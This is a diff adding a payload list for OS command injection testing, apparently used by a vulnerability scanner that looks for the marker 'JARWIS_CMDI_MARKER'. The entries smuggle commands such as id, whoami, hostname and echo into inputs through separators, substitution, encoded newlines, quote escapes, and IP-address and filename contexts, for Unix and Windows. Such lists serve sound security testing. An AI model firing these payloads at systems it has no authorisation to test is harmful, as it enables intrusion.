@@ -1,0 +1,82 @@
+# OS Command Injection - Basic Payloads
+# Used for inline detection where command output appears in response
+
+# Simple command chaining (Unix)
+;id
+;whoami
+;uname -a
+;hostname
+;pwd
+;ls -la
+|id
+|whoami
+|uname -a
+|hostname
+||id
+||whoami
+&&id
+&&whoami
+
+# Command substitution (Unix)
+$(id)
+$(whoami)
+$(uname -a)
+$(hostname)
+`id`
+`whoami`
+`uname -a`
+`hostname`
+
+# Math operations for unique detection
+;expr 163 + 326
+|expr 163 + 326
+$(expr 163 + 326)
+`expr 163 + 326`
+;echo $((163+326))
+|echo $((163+326))
+
+# Echo with unique marker
+;echo JARWIS_CMDI_MARKER
+|echo JARWIS_CMDI_MARKER
+$(echo JARWIS_CMDI_MARKER)
+`echo JARWIS_CMDI_MARKER`
+
+# Newline injection (Unix)
+%0aid
+%0awhoami
+%0aecho JARWIS_CMDI_MARKER
+%0d%0aid
+%0d%0awhoami
+\nid
+\nwhoami
+
+# Windows basic commands
+&echo JARWIS_CMDI_MARKER
+|echo JARWIS_CMDI_MARKER
+&hostname
+|hostname
+&whoami
+|whoami
+&set
+|set
+
+# Quote escaping variations
+';id;'
+";id;"
+';echo JARWIS_CMDI_MARKER;'
+";echo JARWIS_CMDI_MARKER;"
+';id;#
+";id;#
+
+# IP address context (common vulnerable patterns)
+127.0.0.1;id
+127.0.0.1|id
+127.0.0.1;echo JARWIS_CMDI_MARKER
+localhost;id
+localhost|id
+
+# Filename context
+test.txt;id
+test.txt|id
+/tmp/test;id
+C:\temp\test&whoami
